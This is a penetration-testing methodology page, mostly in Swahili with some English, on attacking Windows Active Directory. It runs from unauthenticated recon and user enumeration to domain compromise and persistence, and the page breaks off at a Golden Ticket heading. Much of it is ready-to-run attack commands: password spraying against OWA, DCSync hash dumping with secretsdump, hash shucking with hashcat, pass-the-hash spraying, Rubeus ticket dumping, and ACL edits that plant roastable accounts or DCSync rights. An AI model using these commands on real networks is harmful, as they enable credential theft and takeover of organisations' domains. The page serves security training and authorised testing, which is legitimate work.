# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa msingi

**Active Directory** hutumika kama teknolojia ya msingi, ikiwezesha **network administrators** kuunda na kusimamia kwa ufanisi **domains**, **users**, na **objects** ndani ya mtandao. Imeundwa ili kupanuka, kurahisisha upangaji wa idadi kubwa ya users kuwa **groups** na **subgroups** zinazoweza kusimamiwa, huku ikidhibiti **access rights** katika viwango mbalimbali.

Muundo wa **Active Directory** unajumuisha tabaka kuu tatu: **domains**, **trees**, na **forests**. **Domain** hujumuisha mkusanyiko wa objects, kama vile **users** au **devices**, zinazoshiriki database moja ya pamoja. **Trees** ni vikundi vya domains hivi vilivyounganishwa na muundo wa pamoja, na **forest** huwakilisha mkusanyiko wa trees nyingi, zilizounganishwa kupitia **trust relationships**, zikijenga tabaka la juu kabisa la muundo wa shirika. **Access** na **communication rights** maalum zinaweza kuainishwa katika kila moja ya viwango hivi.

Dhana muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Huhifadhi taarifa zote zinazohusiana na objects za Active Directory.
2. **Object** – Huashiria huluki ndani ya directory, ikijumuisha **users**, **groups**, au **shared folders**.
3. **Domain** – Hutumika kama kontena la directory objects, ikiwa na uwezo wa domains nyingi kuishi pamoja ndani ya **forest**, kila moja likidumisha mkusanyiko wake wa objects.
4. **Tree** – Mkusanyiko wa domains zinazoshiriki root domain moja ya pamoja.
5. **Forest** – Kilele cha muundo wa shirika katika Active Directory, kilichojengwa na trees kadhaa zenye **trust relationships** kati yao.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi wa kati na mawasiliano ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Huhifadhi data katika sehemu moja na kusimamia mwingiliano kati ya **users** na **domains**, ikijumuisha **authentication** na kazi za **search**.
2. **Certificate Services** – Husimamia uundaji, usambazaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Huunga mkono applications zinazoendeshwa na directory kupitia **LDAP protocol**.
4. **Directory Federation Services** – Hutoa uwezo wa **single-sign-on** kuthibitisha users katika web applications nyingi ndani ya session moja.
5. **Rights Management** – Husaidia kulinda nyenzo zenye copyright kwa kudhibiti usambazaji na matumizi yasiyoidhinishwa.
6. **DNS Service** – Muhimu kwa utatuzi wa **domain names**.

Kwa maelezo zaidi, angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD** unahitaji **understand** vizuri sana mchakato wa **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kuangalia mengi katika [https://wadcoms.github.io/](https://wadcoms.github.io) ili kupata muhtasari wa haraka wa ni commands gani unaweza kuendesha ili ku-enumerate/exploit AD.

> [!WARNING]
> Mawasiliano ya Kerberos **yanahitaji full qualifid name (FQDN)** ili kufanya actions. Ukijaribu kufikia machine kwa IP address, **itatumia NTLM na si kerberos**.

## Recon Active Directory (No creds/sessions)

Ikiwa una access tu kwenye mazingira ya AD lakini huna credentials/sessions yoyote, unaweza:

- **Pentest the network:**
- Scan network, pata machines na open ports na ujaribu **exploit vulnerabilities** au **extract credentials** kutoka kwao (kwa mfano, [printers could be very interesting targets](ad-information-in-printers.md).
- Kufanya enumerating DNS kunaweza kutoa taarifa kuhusu key servers kwenye domain kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Angalia mwongozo wa jumla wa [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) ili kupata taarifa zaidi kuhusu jinsi ya kufanya hivi.
- **Check for null and Guest access on smb services** (hii haitafanya kazi kwenye modern Windows versions):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina zaidi wa jinsi ya ku-enumerate SMB server unaweza kupatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina zaidi wa jinsi ya ku-enumerate LDAP unaweza kupatikana hapa (weka umakini **maalum kwa anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Kusanya credentials kwa [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Fikia host kwa [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Toa usernames/names kutoka kwenye internal documents, social media, services (hasa web) ndani ya domain environments na pia kutoka kwa taarifa zinazopatikana hadharani.
- Ukipata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu tofauti za AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Conventions zinazojulikana zaidi ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila sehemu), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 za nasibu na nambari 3 za nasibu (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username is requested** server itajibu kwa kutumia **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ikituruhusu kubaini kuwa username hiyo si sahihi. **Valid usernames** zitasababisha ama **TGT in a AS-REP** response au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, ikionyesha kuwa user anatakiwa kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya MS-NRPC (Netlogon) interface kwenye domain controllers. Mbinu hii huita function `DsrGetDcNameEx2` baada ya kufunga MS-NRPC interface ili kuangalia kama user au computer ipo bila credentials zozote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) hutekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ukipata moja ya seva hizi kwenye mtandao unaweza pia kufanya **user enumeration dhidi yake**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Unaweza kupata orodha za majina ya watumiaji katika [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  na hii nyingine ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Hata hivyo, unapaswa kuwa na **majina ya watu wanaofanya kazi kwenye kampuni** kutoka hatua ya recon ambayo unapaswa kuwa umefanya kabla ya hii. Kwa jina na surname ungeweza kutumia script [**namemash.py**](https://gist.github.com/superkojiman/11076951) kutengeneza potential valid usernames.

### Knowing one or several usernames

Sawa, kwa hiyo unajua tayari una valid username lakini hakuna passwords... Kisha jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa user **haina** attribute _DONT_REQ_PREAUTH_ unaweza **kuomba AS_REP message** kwa ajili ya user huyo ambalo litakuwa na some data iliyosimbwa kwa kutumia derivation ya password ya user.
- [**Password Spraying**](password-spraying.md): Hebu tujaribu passwords **zinazojulikana zaidi** na kila mmoja wa users waliogunduliwa, labda user fulani anatumia password mbaya (kumbuka password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Unaweza **kupata** baadhi ya challenge **hashes** za kuvunja kwa **poisoning** baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umefanikiwa ku-enumerate active directory utakuwa na **emails zaidi na uelewa bora wa network**. Unaweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  ili kupata access ya AD env.

### NetExec workspace-driven recon & relay posture checks

- Tumia **`nxcdb` workspaces** kuhifadhi AD recon state kwa kila engagement: **`workspace create <name>`** huanzisha SQLite DBs za kila protocol chini ya `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Badili views kwa **`proto smb|mssql|winrm`** na orodhesha secrets zilizokusanywa kwa **`creds`**. Ondoa kwa mikono data nyeti ukimaliza: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery kwa **`netexec smb <cidr>`** huonyesha **domain**, **OS build**, **SMB signing requirements**, na **Null Auth**. Members wanaoonyesha `(signing:False)` ni **relay-prone**, wakati DCs mara nyingi huhitaji signing.
- Generate **hostnames in /etc/hosts** moja kwa moja kutoka NetExec output ili kurahisisha targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wakati **SMB relay kwenda DC imezuiwa** na signing, bado chunguza posture ya **LDAP**: `netexec ldap <dc>` huonyesha `(signing:None)` / weak channel binding. DC iliyo na SMB signing required lakini LDAP signing disabled bado ni lengo linalowezekana la **relay-to-LDAP** kwa abuses kama **SPN-less RBCD**.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UIs wakati mwingine **huembed masked admin passwords katika HTML**. Kuangalia source/devtools kunaweza kufichua cleartext (kwa mfano, `<input value="<password>">`), kuruhusu Basic-auth access ili kuchanganua/kuprint repositories.
- Retrieved print jobs zinaweza kuwa na **plaintext onboarding docs** zenye passwords za kila user. Weka pairings zikiwa aligned unapojaribu:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** treats every NT hash you already possess as a candidate password for other, slower formats whose key material is derived directly from the NT hash. Instead of brute-forcing long passphrases in Kerberos RC4 tickets, NetNTLM challenges, or cached credentials, you feed the NT hashes into Hashcat’s NT-candidate modes and let it validate password reuse without ever learning the plaintext. This is especially potent after a domain compromise where you can harvest thousands of current and historical NT hashes.

Use shucking when:

- You have an NT corpus from DCSync, SAM/SECURITY dumps, or credential vaults and need to test for reuse in other domains/forests.
- You capture RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, or DCC/DCC2 blobs.
- You want to quickly prove reuse for long, uncrackable passphrases and immediately pivot via Pass-the-Hash.

The technique **does not work** against encryption types whose keys are not the NT hash (e.g., Kerberos etype 17/18 AES). If a domain enforces AES-only, you must revert to the regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries dramatically widen the candidate pool because Microsoft can store up to 24 previous hashes per account. For more ways to harvest NTDS secrets see:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (or Mimikatz `lsadump::sam /patch`) extracts local SAM/SECURITY data and cached domain logons (DCC/DCC2). Deduplicate and append those hashes to the same `nt_candidates.txt` list.
- **Track metadata** – Keep the username/domain that produced each hash (even if the wordlist contains only hex). Matching hashes tell you immediately which principal is reusing a password once Hashcat prints the winning candidate.
- Prefer candidates from the same forest or a trusted forest; that maximizes the chance of overlap when shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ukifanikiwa kuorodhesha active directory utakuwa na **barua pepe zaidi na uelewa bora wa mtandao**. Huenda ukaweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sasa kwa kuwa una baadhi ya basic credentials unapaswa kuangalia kama unaweza **kupata** faili zozote **zinazovutia zinazoshirikiwa ndani ya AD**. Utaweza kufanya hivyo kwa mikono lakini ni kazi ya kuchosha inayojirudia-rudia sana (na zaidi ukipata mamia ya docs unazohitaji kuzikagua).

[**Fuata link hii ili ujifunze kuhusu tools unazoweza kutumia.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza **kufikia PCs nyingine au shares** unaweza **kuweka faili** (kama SCF file) ambazo zikifikiwa kwa namna fulani zita**anzisha NTLM authentication dhidi yako** ili uweze **kuiba** **NTLM challenge** na ku-crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Udhaifu huu uliwaruhusu watumiaji wowote waliothibitishwa **ku-compromise domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Kwa mbinu zifuatazo mtumiaji wa kawaida wa domain haitoshi, unahitaji baadhi ya special privileges/credentials ili kutekeleza mashambulizi haya.**

### Hash extraction

Tunatumaini umefanikiwa **ku-compromise account ya local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa dump hashes zote zilizo kwenye memory na locally.\
[**Soma ukurasa huu kuhusu njia tofauti za kupata hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara tu unapokuwa na hash ya mtumiaji**, unaweza kuitumia ku**m-impersonate**.\
Unahitaji kutumia **tool** fulani itakayofanya **NTLM authentication kwa kutumia** hiyo **hash**, **au** unaweza kuunda **sessionlogon** mpya na **ku-inject** hiyo **hash** ndani ya **LSASS**, hivyo wakati wowote **NTLM authentication inapofanywa**, hiyo **hash itatumika.** Chaguo la mwisho ndilo hufanywa na mimikatz.\
[**Soma ukurasa huu kwa taarifa zaidi.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulizi hili linalenga **kutumia user NTLM hash kuomba Kerberos tickets**, kama njia mbadala ya kawaida ya Pass The Hash kupitia NTLM protocol. Kwa hiyo, hili linaweza kuwa hasa **la manufaa katika mitandao ambapo NTLM protocol imezimwa** na ni **Kerberos pekee inaruhusiwa** kama authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika mbinu ya shambulizi ya **Pass The Ticket (PTT)**, attackers **huiba authentication ticket ya mtumiaji** badala ya password yake au hash values. Kisha ticket hii iliyoibiwa hutumiwa **kumu-impersonate mtumiaji**, na kupata unauthorized access kwa resources na services ndani ya mtandao.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrator** unapaswa kujaribu **kuingia locally** kwenye **PCs** nyingine kwa kutumia hiyo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba hili ni **noisy** sana na **LAPS** lingeweza **kuzuia** hilo.

### MSSQL Abuse & Trusted Links

Ikiwa mtumiaji ana ruhusa za **kufikia MSSQL instances**, anaweza kuwa na uwezo wa **kuendesha commands** kwenye host ya MSSQL (ikiwa inaendeshwa kama SA), **kuiba** NetNTLM **hash** au hata kutekeleza **relay** **attack**.\
Pia, ikiwa MSSQL instance inaaminika (database link) na MSSQL instance nyingine. Ikiwa mtumiaji ana ruhusa juu ya trusted database, ataweza **kutumia trust relationship kuendesha queries pia kwenye instance nyingine**. Hizi trusts zinaweza kuchainiwa na wakati fulani mtumiaji anaweza kupata database iliyosanidiwa vibaya ambapo anaweza kuendesha commands.\
**Links kati ya databases hufanya kazi hata kupitia forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory na deployment suites mara nyingi hufichua njia zenye nguvu za kupata credentials na code execution. Angalia:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ukikuta Computer object yoyote yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una domain privileges kwenye computer hiyo, utaweza dump TGTs kutoka memory ya kila user anayelogin kwenye computer hiyo.\
Hivyo, kama **Domain Admin anelogin kwenye computer**, utaweza dump TGT yake na kumwiga kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Kwa msaada wa constrained delegation unaweza hata **kuchukua kabisa Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa user au computer imeruhusiwa kwa "Constrained Delegation" itaweza **kumwiga user yeyote ili kufikia baadhi ya services kwenye computer**.\
Kisha, ukipata **hash** ya user/computer huyu utaweza **kumwiga user yeyote** (hata domain admins) kufikia baadhi ya services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na privilege ya **WRITE** kwenye Active Directory object ya computer ya mbali huwezesha kupata code execution kwa **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

User aliyeathiriwa anaweza kuwa na baadhi ya **privileges za kuvutia juu ya baadhi ya domain objects** ambazo zinaweza kukuruhusu **kusogea** laterally/**kukuza** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Kugundua **Spool service inayosikiliza** ndani ya domain kunaweza **kutumiwa vibaya** ili **kupata credentials mpya** na **kukuza privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ikiwa **other users** **wanaaccess** machine **iliyoathiriwa**, inawezekana **kukusanya credentials kutoka memory** na hata **kudunga beacons kwenye processes zao** ili kuwaiga.\
Kwa kawaida users watafikia system kupitia RDP, hivyo hapa una namna ya kutekeleza mashambulizi kadhaa dhidi ya third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **local Administrator password** kwenye domain-joined computers, ukihakikisha ni **randomized**, unique, na hubadilishwa mara kwa mara. Password hizi huhifadhiwa kwenye Active Directory na access inadhibitiwa kupitia ACLs kwa authorized users pekee. Ukiwa na permissions za kutosha kufikia passwords hizi, pivoting kwenda kwa computers nyingine huwa inawezekana.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Kukusanya certificates** kutoka kwenye machine iliyoathiriwa kunaweza kuwa njia ya kukuza privileges ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ikiwa **vulnerable templates** zimesanidiwa inawezekana kuzitumia vibaya ili kukuza privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Ukishapata **Domain Admin** au bora zaidi **Enterprise Admin** privileges, unaweza **dump** **domain database**: _ntds.dit_.

[**Taarifa zaidi kuhusu DCSync attack zinaweza kupatikana hapa**](dcsync.md).

[**Taarifa zaidi kuhusu jinsi ya kuiba NTDS.dit zinaweza kupatikana hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Baadhi ya techniques zilizojadiliwa hapo awali zinaweza kutumika kwa persistence.\
Kwa mfano unaweza:

- Kufanya users wawe vulnerable kwa [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kufanya users wawe vulnerable kwa [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Kumpa user ruhusa za [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** huunda **legitimate Ticket Granting Service (TGS) ticket** kwa service mahususi kwa kutumia **NTLM hash** (kwa mfano, **hash ya akaunti ya PC**). Njia hii hutumiwa ili **kupata service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

